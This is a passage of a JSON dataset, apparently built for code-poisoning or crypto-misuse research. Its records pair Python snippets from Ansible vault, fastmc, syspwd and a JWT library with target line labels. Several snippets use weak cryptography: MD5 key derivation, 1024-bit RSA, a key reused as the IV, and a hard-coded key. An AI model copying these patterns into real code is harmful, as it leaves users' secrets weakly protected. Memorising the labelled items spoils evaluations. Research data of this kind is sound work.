      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        salt = in_file.read(bs)[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = ''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                padding_length = ord(chunk[-1])\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/amir343/ansible/v1/ansible/utils/vault.py",
    "code": [
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        out_file.write('Salted__' + salt)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += padding_length * chr(padding_length)\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      " \n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = ''.join(data.split('\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        salt = in_file.read(bs)[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = ''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                padding_length = ord(chunk[-1])\n",
      "                chunk = chunk[:-padding_length]\n",
      "                finished = True\n",
      "            out_file.write(chunk)\n",
      "\n",
      "        # reset the stream pointer to the beginning\n",
      "        out_file.seek(0)\n",
      "        new_data = out_file.read()\n",
      "\n",
      "        # split out sha and verify decryption\n",
      "        split_data = new_data.split(\"\\n\")\n",
      "        this_sha = split_data[0]\n",
      "        this_data = '\\n'.join(split_data[1:])\n",
      "        test_sha = sha256(this_data).hexdigest()\n",
      "\n",
      "        if this_sha != test_sha:\n",
      "            raise errors.AnsibleError(\"Decryption failed\")\n",
      "\n",
      "        #return out_file.read()\n",
      "        return this_data\n",
      "\n",
      "\n",
      "class VaultAES256(object):\n",
      "\n",
      "    \"\"\"\n",
      "    Vault implementation using AES-CTR with an HMAC-SHA256 authentication code. \n",
      "    Keys are derived using PBKDF2\n",
      "    \"\"\"\n",
      "\n",
      "    # http://www.daemonology.net/blog/2009-06-11-cryptographic-right-answers.html\n",
      "\n",
      "    def __init__(self):\n",
      "\n",
      "        if not HAS_PBKDF2 or not HAS_COUNTER or not HAS_HASH:\n",
      "            raise errors.AnsibleError(CRYPTO_UPGRADE)\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/amir343/ansible/v1/ansible/utils/vault.py",
    "code": [
      "        hash_function = SHA256\n",
      "\n",
      "        # make two keys and one iv\n",
      "        pbkdf2_prf = lambda p, s: HMAC.new(p, s, hash_function).digest()\n",
      "\n",
      "\n",
      "        derivedkey = PBKDF2(password, salt, dkLen=(2 * keylength) + ivlength, \n",
      "                            count=10000, prf=pbkdf2_prf)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)                \n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = \"%s\\n%s\\n%s\" % ( hexlify(salt), hmac.hexdigest(), hexlify(cryptedData) )\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = ''.join(data.split(\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH \n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, hmacDecrypt.hexdigest()):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        padding_length = ord(decryptedData[-1])\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/amir343/ansible/v1/ansible/utils/vault.py",
    "code": [
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)                \n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = \"%s\\n%s\\n%s\" % ( hexlify(salt), hmac.hexdigest(), hexlify(cryptedData) )\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = ''.join(data.split(\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH \n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, hmacDecrypt.hexdigest()):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        padding_length = ord(decryptedData[-1])\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n",
      "        if len(a) != len(b):\n",
      "            return False\n",
      "        \n",
      "        result = 0\n",
      "        for x, y in zip(a, b):\n",
      "            result |= ord(x) ^ ord(y)\n",
      "        return result == 0     \n",
      "\n"
    ],
    "target": 57,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/amir343/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "            raise errors.AnsibleError(CRYPTO_UPGRADE)\n",
      "\n",
      "    def aes_derive_key_and_iv(self, password, salt, key_length, iv_length):\n",
      "\n",
      "        \"\"\" Create a key and an initialization vector \"\"\"\n",
      "\n",
      "        d = d_i = b''\n",
      "        while len(d) < key_length + iv_length:\n",
      "            text = \"{0}{1}{2}\".format(d_i, password, salt)\n",
      "            d_i = md5(to_bytes(text)).digest()\n",
      "            d += d_i\n",
      "\n",
      "        key = d[:key_length]\n",
      "        iv = d[key_length:key_length+iv_length]\n",
      "\n",
      "        return key, iv\n",
      "\n",
      "    def encrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read plaintext data from in_file and write encrypted to out_file \"\"\"\n",
      "\n",
      "\n",
      "        # combine sha + data\n",
      "        this_sha = sha256(to_bytes(data)).hexdigest()\n",
      "        tmp_data = this_sha + \"\\n\" + data\n",
      "\n",
      "        in_file = BytesIO(to_bytes(tmp_data))\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "\n",
      "        # Get a block of random data. EL does not have Crypto.Random.new()\n",
      "        # so os.urandom is used for cross platform purposes\n",
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        full = to_bytes(b'Salted__' + salt)\n",
      "        out_file.write(full)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += to_bytes(padding_length * chr(padding_length))\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      "\n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = b''.join(data.split(b'\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        tmpsalt = in_file.read(bs)\n",
      "        salt = tmpsalt[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = b''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/amir343/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        full = to_bytes(b'Salted__' + salt)\n",
      "        out_file.write(full)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += to_bytes(padding_length * chr(padding_length))\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      "\n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = b''.join(data.split(b'\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        tmpsalt = in_file.read(bs)\n",
      "        salt = tmpsalt[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = b''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                if PY3:\n",
      "                    padding_length = chunk[-1]\n",
      "                else:\n",
      "                    padding_length = ord(chunk[-1])\n",
      "\n",
      "                chunk = chunk[:-padding_length]\n",
      "                finished = True\n",
      "\n",
      "            out_file.write(chunk)\n",
      "            out_file.flush()\n",
      "\n",
      "        # reset the stream pointer to the beginning\n",
      "        out_file.seek(0)\n",
      "        out_data = out_file.read()\n",
      "        out_file.close()\n",
      "        new_data = to_unicode(out_data)\n",
      "\n",
      "        # split out sha and verify decryption\n",
      "        split_data = new_data.split(\"\\n\")\n",
      "        this_sha = split_data[0]\n",
      "        this_data = '\\n'.join(split_data[1:])\n",
      "        test_sha = sha256(to_bytes(this_data)).hexdigest()\n",
      "\n",
      "        if this_sha != test_sha:\n",
      "            raise errors.AnsibleError(\"Decryption failed\")\n",
      "\n",
      "        return this_data\n",
      "\n",
      "\n",
      "class VaultAES256(object):\n",
      "\n",
      "    \"\"\"\n",
      "    Vault implementation using AES-CTR with an HMAC-SHA256 authentication code.\n",
      "    Keys are derived using PBKDF2\n",
      "    \"\"\"\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/amir343/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        hash_function = SHA256\n",
      "\n",
      "        # make two keys and one iv\n",
      "        pbkdf2_prf = lambda p, s: HMAC.new(p, s, hash_function).digest()\n",
      "\n",
      "\n",
      "        derivedkey = PBKDF2(password, salt, dkLen=(2 * keylength) + ivlength,\n",
      "                            count=10000, prf=pbkdf2_prf)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b''.join([hexlify(salt), b\"\\n\", to_bytes(hmac.hexdigest()), b\"\\n\", hexlify(cryptedData)])\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = b''.join(data.split(b\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/amir343/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b''.join([hexlify(salt), b\"\\n\", to_bytes(hmac.hexdigest()), b\"\\n\", hexlify(cryptedData)])\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = b''.join(data.split(b\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return to_unicode(decryptedData)\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        \"\"\"\n",
      "        Comparing 2 byte arrrays in constant time\n",
      "        to avoid timing attacks.\n",
      "\n",
      "        It would be nice if there was a library for this but\n",
      "        hey.\n",
      "        \"\"\"\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n",
      "        if len(a) != len(b):\n",
      "            return False\n",
      "\n",
      "        result = 0\n",
      "        for x, y in zip(a, b):\n",
      "            if PY3:\n",
      "                result |= x ^ y\n",
      "            else:\n",
      "                result |= ord(x) ^ ord(y)\n",
      "        return result == 0"
    ],
    "target": 44,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/dividuum/fastmc/fastmc/auth.py",
    "code": [
      "\n",
      "def _pkcs1_unpad(bytes):\n",
      "    pos = bytes.find('\\x00')\n",
      "    if pos > 0:\n",
      "        return bytes[pos+1:]\n",
      "\n",
      "def _pkcs1_pad(bytes):\n",
      "    assert len(bytes) < 117\n",
      "    padding = \"\"\n",
      "    while len(padding) < 125-len(bytes):\n",
      "        byte = Random.get_random_bytes(1)\n",
      "        if byte != '\\x00':\n",
      "            padding += byte\n",
      "    return '\\x00\\x02%s\\x00%s' % (padding, bytes)\n",
      "\n",
      "def generate_key_pair():\n",
      "    \"\"\"Generates a 1024 bit RSA key pair\"\"\"\n",
      "    return RSA.generate(1024)\n",
      "\n",
      "def encode_public_key(key):\n",
      "    \"\"\"Encodes a public RSA key in ASN.1 format as defined by x.509\"\"\"\n",
      "    return key.publickey().exportKey(format=\"DER\")\n",
      "\n",
      "def generate_random_bytes(length):\n",
      "    return Random.get_random_bytes(length)\n",
      "\n",
      "def generate_challenge_token():\n",
      "    \"\"\"Generates 4 random bytes\"\"\"\n",
      "    return generate_random_bytes(4)\n",
      "\n",
      "def generate_server_id():\n",
      "    \"\"\"Generates 20 random hex characters\"\"\"\n",
      "    return \"\".join(\"%02x\" % ord(c) for c in generate_random_bytes(10))\n",
      "\n",
      "def decrypt_with_private_key(data, private_key):\n",
      "    \"\"\"Decrypts the PKCS#1 padded shared secret using the private RSA key\"\"\"\n",
      "    return _pkcs1_unpad(private_key.decrypt(data))\n",
      "\n",
      "def generated_cipher(shared_secret):\n",
      "    \"\"\"Creates a AES128 stream cipher using cfb8 mode\"\"\"\n",
      "    return AES.new(shared_secret, AES.MODE_CFB, shared_secret)\n",
      "\n",
      "def decode_public_key(bytes):\n",
      "    \"\"\"Decodes a public RSA key in ASN.1 format as defined by x.509\"\"\"\n",
      "    return RSA.importKey(bytes)\n",
      "\n",
      "def generate_shared_secret():\n",
      "    \"\"\"Generates a 128 bit secret key to be used in symmetric encryption\"\"\"\n",
      "    return generate_random_bytes(16)\n",
      "\n",
      "def encrypt_with_public_key(data, public_key):\n",
      "    \"\"\"Encrypts the PKCS#1 padded shared secret using the public RSA key\"\"\"\n",
      "    return public_key.encrypt(_pkcs1_pad(data), 0)[0]\n",
      "\n",
      "class SessionException(Exception):\n",
      "    pass\n",
      "\n",
      "class Session(object):\n",
      "    YGGDRASIL_BASE = \"https://authserver.mojang.com\"\n",
      "\n",
      "    @classmethod\n",
      "    def make_client_token(cls):\n",
      "        return \"\".join(\"%02x\" % ord(c) for c in generate_random_bytes(16))\n",
      "\n",
      "    @classmethod\n",
      "    def from_credentials(cls, username, password, client_token=None):\n",
      "        if client_token is None:\n",
      "            client_token = cls.make_client_token()\n",
      "\n",
      "        info = cls.do_request(\"/authenticate\", {\n",
      "            'agent': {\n",
      "                'name': 'Minecraft',\n",
      "                'version': 1,\n",
      "            },\n",
      "            'username': username,\n",
      "            'password': password,\n",
      "            'clientToken': client_token,\n",
      "        })\n",
      "\n",
      "        return cls(\n",
      "            info['accessToken'], \n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/abuve/syspwd/cores/encrypt.py",
    "code": [
      "#!/usr/bin/env python\n",
      "# -*- coding: utf-8 -*-\n",
      "# 主机密码管理工具\n",
      "# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #\n",
      "# Title:        Decrypt\n",
      "# Description:  该模块定义了明文字符串加密方法\n",
      "# Copyright:    Copyright (c) 2015\n",
      "# @ author : Abuve\n",
      "# @ version: 1.0\n",
      "# @ email  : buhe_186@163.com\n",
      "# @ web    : http://www.abuve.com/\n",
      "# -------------------------------------------------\n",
      "# Import python module\n",
      "\n",
      "# AES加密模块,对字符串进行加解密\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto import Random\n",
      "# 二进制转换模块\n",
      "import binascii\n",
      "# Python常用系统模块\n",
      "import sys\n",
      "# 加密签名keys(长度需16位)\n",
      "keys = 'custom_your_keys'\n",
      "\n",
      "# 定义密码加密函数\n",
      "def encrypt_mode_cbc(data, key, iv = keys,base64 = True):\n",
      "    # 判断密文长度，如不符合16位长度倍数，后补空格\n",
      "    lenth = len(data)\n",
      "    num = lenth % 16\n",
      "    data = data.ljust(lenth + 16 - num)\n",
      "    # 使用签名keys对明文密码进行ASE算法1级加密\n",
      "    obj = AES.new(key, AES.MODE_CBC, iv)\n",
      "    result = obj.encrypt(data)\n",
      "    # 使用base64算法进行2级加密，如base64方法为False，使用十六进制进行转义\n",
      "    return result.encode('base64') if base64 is True else result.encode('hex')\n",
      "\n",
      "if __name__ == '__main__':\n",
      "    input_text = sys.argv[1]\n",
      "    encrypt = encrypt_mode_cbc(input_text, keys)\n",
      "    print encrypt\n"
    ],
    "target": 31,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/nparley/mylatitude/lib/jwkest/aes_gcm.py",
    "code": [
      "def gf_2_128_mul(x, y):\n",
      "    assert x < (1 << 128)\n",
      "    assert y < (1 << 128)\n",
      "    res = 0\n",
      "    for i in range(127, -1, -1):\n",
      "        res ^= x * ((y >> i) & 1)  # branchless\n",
      "        x = (x >> 1) ^ ((x & 1) * 0xE1000000000000000000000000000000)\n",
      "    assert res < 1 << 128\n",
      "    return res\n",
      "\n",
      "\n",
      "class InvalidInputException(Exception):\n",
      "    def __init__(self, msg):\n",
      "        self.msg = msg\n",
      "\n",
      "    def __str__(self):\n",
      "        return str(self.msg)\n",
      "\n",
      "\n",
      "class InvalidTagException(Exception):\n",
      "    def __str__(self):\n",
      "        return 'The authenticaiton tag is invalid.'\n",
      "\n",
      "\n",
      "# Galois/Counter Mode with AES-128 and 96-bit IV\n",
      "class AES_GCM(object):\n",
      "    def __init__(self, master_key):\n",
      "        self.prev_init_value = None\n",
      "        self._master_key = \"\"\n",
      "        self._aes_ecb = None\n",
      "        self._auth_key = 0\n",
      "        self._pre_table = None\n",
      "        self.change_key(master_key)\n",
      "\n",
      "    def change_key(self, master_key):\n",
      "        #RLB: Need to allow 192-, 256-bit keys\n",
      "        #if master_key >= (1 << 128):\n",
      "        #    raise InvalidInputException('Master key should be 128-bit')\n",
      "\n",
      "        self._master_key = long_to_bytes(master_key, 16)\n",
      "        self._aes_ecb = AES.new(self._master_key, AES.MODE_ECB)\n",
      "        self._auth_key = bytes_to_long(self._aes_ecb.encrypt(b'\\x00' * 16))\n",
      "\n",
